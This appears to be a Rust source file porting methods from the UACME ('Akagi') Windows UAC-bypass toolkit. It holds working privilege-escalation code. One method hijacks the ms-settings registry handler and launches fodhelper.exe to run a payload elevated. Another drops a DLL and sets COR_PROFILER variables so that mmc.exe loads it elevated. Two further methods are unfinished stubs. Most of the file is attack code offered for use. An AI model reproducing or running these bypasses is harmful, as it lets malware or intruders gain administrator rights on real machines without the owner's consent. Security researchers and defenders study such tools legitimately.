// Oddvar Moe (api0cradle) UAC bypass methods
// Port of Source/Akagi/methods/api0cradle.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;

/// Method 33: MS Settings
/// Bypass UAC using ms-settings protocol handler
pub fn method_ms_settings(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 33] MS Settings");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    // Use fodhelper.exe with registry hijacking
    fodhelper_registry_hijack(&payload_str, "ms-settings")
}

/// Method 34: Disk Silent Cleanup
/// Bypass UAC using DiskCleanup scheduled task with environment variable
pub fn method_disk_cleanup(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 34] Disk Silent Cleanup");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    // Use environment variable hijacking
    super::tyranid::method_disk_cleanup_env(ctx, &payload_str)
}

/// Method 39: Cor Profiler
/// Bypass UAC using COR_PROFILER environment variable
pub fn method_cor_profiler(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 39] Cor Profiler");
    
    let payload_dll = match &params.payload_code {
        Some(dll) => dll,
        None => {
            log::error!("No payload DLL provided");
            return constants::STATUS_INVALID_PARAMETER;
        }
    };
    
    cor_profiler_method(ctx, payload_dll)
}

/// Method 41: CMLuaUtil
/// Bypass UAC using undocumented CMLuaUtil COM interface
pub fn method_cmluautil(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 41] CMLuaUtil");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    cmluautil_shell_exec(&payload_str)
}

/// Method 43: Dccw COM
/// Bypass UAC using dccw.exe with COM elevation
pub fn method_dccw_com(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 43] Dccw COM");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    // Use ColorDataProxy COM object
    color_data_proxy_method(&payload_str)
}

/// FodHelper registry hijack
fn fodhelper_registry_hijack(payload: &str, protocol: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    
    // Registry path: HKCU\Software\Classes\ms-settings\shell\open\command
    let reg_path = format!("Software\\Classes\\{}\\shell\\open\\command", protocol);
    let reg_path_wide = to_wide_string(&reg_path);
    
    unsafe {
        // Create registry key
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path_wide,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        // Set default value to payload
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            log::error!("Failed to set registry value");
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Set DelegateExecute to empty string
        let delegate_wide = to_wide_string("DelegateExecute");
        let _ = key.set_string_value(&delegate_wide, &empty_wide);
        
        // Launch fodhelper.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let fodhelper = format!("{}fodhelper.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&fodhelper), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                
                // Wait for execution
                std::thread::sleep(std::time::Duration::from_secs(3));
                
                constants::STATUS_SUCCESS
            }
            Err(e) => {
                log::error!("Failed to launch fodhelper: {}", e);
                constants::STATUS_ACCESS_DENIED
            }
        };
        
        // Cleanup registry
        let classes_path = format!("Software\\Classes\\{}", protocol);
        let classes_path_wide = to_wide_string(&classes_path);
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(classes_path_wide.as_ptr()));
        
        result
    }
}

/// COR_PROFILER method
fn cor_profiler_method(ctx: &mut UacmeContext, proxy_dll: &[u8]) -> MethodResult {
    use windows::Win32::System::Environment::*;
    use std::fs;
    
    // Drop profiler DLL to temp
    let temp_dir = from_wide_string(&ctx.temp_directory);
    let profiler_path = format!("{}profiler.dll", temp_dir);
    
    if let Err(e) = fs::write(&profiler_path, proxy_dll) {
        log::error!("Failed to write profiler DLL: {}", e);
        return constants::STATUS_ACCESS_DENIED;
    }
    
    unsafe {
        // Set COR_ENABLE_PROFILING=1
        let enable_name = to_wide_string("COR_ENABLE_PROFILING");
        let enable_value = to_wide_string("1");
        
        if SetEnvironmentVariableW(
            PCWSTR(enable_name.as_ptr()),
            PCWSTR(enable_value.as_ptr()),
        ).is_err() {
            fs::remove_file(&profiler_path).ok();
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Set COR_PROFILER to CLSID
        let profiler_name = to_wide_string("COR_PROFILER");
        let profiler_clsid = to_wide_string("{cf0d821e-299b-5307-a3d8-b283c03916db}");
        
        if SetEnvironmentVariableW(
            PCWSTR(profiler_name.as_ptr()),
            PCWSTR(profiler_clsid.as_ptr()),
        ).is_err() {
            let _ = SetEnvironmentVariableW(PCWSTR(enable_name.as_ptr()), PCWSTR(std::ptr::null()));
            fs::remove_file(&profiler_path).ok();
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Set COR_PROFILER_PATH to our DLL
        let path_name = to_wide_string("COR_PROFILER_PATH");
        let path_value = to_wide_string(&profiler_path);
        
        if SetEnvironmentVariableW(
            PCWSTR(path_name.as_ptr()),
            PCWSTR(path_value.as_ptr()),
        ).is_err() {
            let _ = SetEnvironmentVariableW(PCWSTR(enable_name.as_ptr()), PCWSTR(std::ptr::null()));
            let _ = SetEnvironmentVariableW(PCWSTR(profiler_name.as_ptr()), PCWSTR(std::ptr::null()));
            fs::remove_file(&profiler_path).ok();
            return constants::STATUS_ACCESS_DENIED;
        }
        
        // Launch .NET autoelevated application (e.g., mmc.exe)
        let sys_dir = from_wide_string(&ctx.system_directory);
        let mmc_path = format!("{}mmc.exe", sys_dir);
        let mmc_params = format!("{} eventvwr.msc", mmc_path);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&mmc_params), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                
                std::thread::sleep(std::time::Duration::from_secs(5));
                constants::STATUS_SUCCESS
            }
            Err(e) => {
                log::error!("Failed to launch MMC: {}", e);
                constants::STATUS_ACCESS_DENIED
            }
        };
        
        // Cleanup
        let _ = SetEnvironmentVariableW(PCWSTR(enable_name.as_ptr()), PCWSTR(std::ptr::null()));
        let _ = SetEnvironmentVariableW(PCWSTR(profiler_name.as_ptr()), PCWSTR(std::ptr::null()));
        let _ = SetEnvironmentVariableW(PCWSTR(path_name.as_ptr()), PCWSTR(std::ptr::null()));
        fs::remove_file(&profiler_path).ok();
        
        result
    }
}

/// CMLuaUtil ShellExec method
fn cmluautil_shell_exec(payload: &str) -> MethodResult {
    // This requires COM interface ICMLuaUtil
    // CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
    
    log::warn!("CMLuaUtil method requires COM interface - not fully implemented");
    
    // In real implementation:
    // 1. CoCreateInstance with CLSID_CMSTPLUA
    // 2. QueryInterface for IID_ICMLuaUtil
    // 3. Call ShellExec method
    
    constants::STATUS_NOT_IMPLEMENTED
}

/// ColorDataProxy method
fn color_data_proxy_method(payload: &str) -> MethodResult {
    log::warn!("ColorDataProxy method requires COM interface - not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

